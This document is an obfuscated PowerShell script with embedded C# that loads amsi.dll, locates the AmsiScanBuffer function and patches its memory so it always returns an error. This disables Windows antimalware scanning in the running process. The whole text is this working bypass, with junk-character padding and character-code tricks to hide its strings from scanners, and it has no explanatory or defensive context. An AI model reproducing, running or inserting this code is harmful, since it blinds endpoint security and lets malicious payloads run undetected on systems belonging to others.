$dcvrj = @"
u^&*(sin^&*(g Sys^&*(t^&*(em;
usi^&*(ng Sys^&*(tem.Runtime.Inter^&*(opSer^&*(vices;
public class dcvrj {
    [Dl^&*(lI@@@@@@@@@@@((((((((((((((()))))))))))))))mp^&*(ort("ker@@@@@@@@@@@((((((((((((((()))))))))))))))nel32")]
    pu^&*(blic sta^&*(tic exte^&*(rn IntP^&*(tr GetPr^&*(ocAdd^&*(ress(Int^&*(Ptr hMo^&*(dule, st^&*(ring pro^&*(cName);
    [D@@@@@@@@@@@((((((((((((((()))))))))))))))l^&*(lImp^&*(ort("ke^&*(rn^&*(el^&*(32")]
    pu^&*(blic sta^&*(tic ext^&*(ern Int^&*(Ptr Load^&*(Lib^&*(rary(str^&*(ing n^&*(ame);
    [Dl^&*(lIm@@@@@@@@@@@((((((((((((((()))))))))))))))p^&*(ort("ke^&*(rnel3^&*(2")]
    p^&*(ub^&*(lic st^&*(at^&*(ic ex^&*(tern b^&*(ool Virt^&*(ualP@@@@@@@@@@@((((((((((((((()))))))))))))))rote@@@@@@@@@@@((((((((((((((()))))))))))))))ct(Int^&*(Ptr lpAddress, UIn@@@@@@@@@@@((((((((((((((()))))))))))))))tPtr grtylw, uint flNe@@@@@@@@@@@((((((((((((((()))))))))))))))wProtect, out ui@@@@@@@@@@@((((((((((((((()))))))))))))))nt lpfl@@@@@@@@@@@((((((((((((((()))))))))))))))OldP@@@@@@@@@@@((((((((((((((()))))))))))))))ro@@@@@@@@@@@((((((((((((((()))))))))))))))t@@@@@@@@@@@((((((((((((((()))))))))))))))ec@@@@@@@@@@@((((((((((((((()))))))))))))))t);
}
"@.Replace("^&*(","").Replace("@@@@@@@@@@@((((((((((((((()))))))))))))))","")
Add-Type $dcvrj
$xymgyyn = [dcvrj]::LoadLibrary("$(('amsi'+'.dll').NoRmalIZe([chaR]([ByTE]0x46)+[chAr](111)+[Char]([ByTE]0x72)+[chAr]([byte]0x6d)+[cHaR]([Byte]0x44)) -replace [cHAR](92*1/1)+[ChAr](112)+[CHaR](123)+[chAr](77)+[ChAr]([ByTe]0x6e)+[cHaR]([bYTe]0x7d))")
$ppruhu = [dcvrj]::GetProcAddress($xymgyyn, "$([CHar]([BYte]0x41)+[cHAr]([Byte]0x6d)+[chAr](115+85-85)+[Char](105)+[ChaR](83+56-56)+[ChAr](99+13-13)+[CHar](97+59-59)+[ChAR]([byTE]0x6e)+[chAR]([BYTe]0x42)+[Char]([bYte]0x75)+[cHAR](44+58)+[ChAr]([BYte]0x66)+[CHaR]([bYTe]0x65)+[CHAR](114*92/92))")
$p = 0
[dcvrj]::VirtualProtect($ppruhu, [uint32]5, 0x40, [ref]$p)
$junr = "0xB8"
$ccwg = "0x57"
$boxa = "0x00"
$mcet = "0x07"
$tfwz = "0x80"
$dufv = "0xC3"
$scnfh = [Byte[]] ($junr,$ccwg,$boxa,$mcet,+$tfwz,+$dufv)
[System.Runtime.InteropServices.Marshal]::Copy($scnfh, 0, $ppruhu, 6)